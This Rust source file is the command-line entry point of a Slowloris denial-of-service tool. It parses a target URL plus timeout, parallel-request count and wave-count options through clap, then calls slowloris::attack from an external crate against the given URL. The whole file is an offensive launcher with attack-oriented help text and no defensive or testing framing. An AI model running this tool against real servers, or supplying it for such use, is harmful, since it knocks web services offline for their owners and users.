extern crate slowloris;
#[macro_use]
extern crate clap;

use clap::{Arg, ArgMatches};

fn main() {
    let matches = command!()
        .arg(
            Arg::with_name("URL")
                .help("Specifies which URL to attack")
                .required(true),
        )
        .arg(
            Arg::with_name("timeout")
                .short('t')
                .long("timeout")
                .value_name("MILLISECONDS")
                .default_value("4500")
                .help("Sets the amount of time to wait between attacks"),
        )
        .arg(
            Arg::with_name("requests")
                .short('r')
                .long("requests")
                .value_name("NUM")
                .default_value("1024")
                .help("Sets the amount of parallel requests per attack"),
        )
        .arg(
            Arg::with_name("waves")
                .short('w')
                .long("waves")
                .value_name("NUM")
                .default_value("100")
                .help("Sets the amount of total attack waves"),
        )
        .get_matches();

    let url = matches.value_of("URL").unwrap();
    let timeout = unwrap_arg(&matches, "timeout");
    let requests = unwrap_arg(&matches, "requests");
    let waves = unwrap_arg(&matches, "waves");

    slowloris::attack(url, timeout, requests, waves).expect("Error while attacking");
}

fn unwrap_arg(matches: &ArgMatches, name: &str) -> u64 {
    matches.value_of(name).unwrap().parse::<u64>().expect(
        &format!(
            "Please provide a valid number as value for the parameter '{}'",
            name
        ),
    )
}
